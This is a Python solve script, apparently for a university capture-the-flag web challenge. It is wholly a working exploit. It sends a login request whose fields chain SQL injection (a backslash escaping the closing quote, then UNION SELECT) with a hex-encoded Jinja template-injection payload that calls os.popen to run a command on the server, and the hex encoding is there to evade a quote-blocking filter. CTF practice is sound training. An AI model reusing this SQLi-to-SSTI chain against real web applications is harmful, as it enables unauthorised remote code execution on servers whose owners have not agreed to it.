import requests
import re

URL = "https://no-quotes-bb7586abb9570375.chals.uoftctf.org"
URL = URL.rstrip('/')

def solve():
    print(f"[*] Target URL: {URL}")
    
    # 1. Prepare the SSTI payload to execute the readflag binary
    raw_ssti = "{{ request.application.__globals__.__builtins__.__import__('os').popen('/readflag').read() }}"
    
    # 2. Convert payload to HEX to bypass the WAF (No quotes allowed)
    # "0x" prefix tells MySQL to treat it as a hex string
    hex_ssti = "0x" + raw_ssti.encode('utf-8').hex()
    
    # 3. Construct the Injection
    # username = \  -> Escapes the closing quote in SQL, consuming the query up to the password
    # password = ) UNION SELECT ... -> Closes the parenthesis and injects our payload
    payload_data = {
        "username": "\\",
        "password": f") UNION SELECT 1, {hex_ssti} #"
    }
    
    try:
        s = requests.Session()
        print(f"[*] Sending exploit...")
        
        # Send the malicious login request
        r = s.post(f"{URL}/login", data=payload_data)
        
        # 4. Check the response for the flag
        if r.status_code == 200:
            flag = re.search(r"uoftctf\{.*?\}", r.text)
            if flag:
                print(f"\n[+] FLAG FOUND: {flag.group(0)}")
            else:
                print("\n[-] Exploit sent, but flag not found in response.")
        else:
            print(f"[-] Error: Status code {r.status_code}")
            
    except requests.exceptions.ConnectionError:
        print("\n[!] Connection Error. Check URL.")

if __name__ == "__main__":
    solve()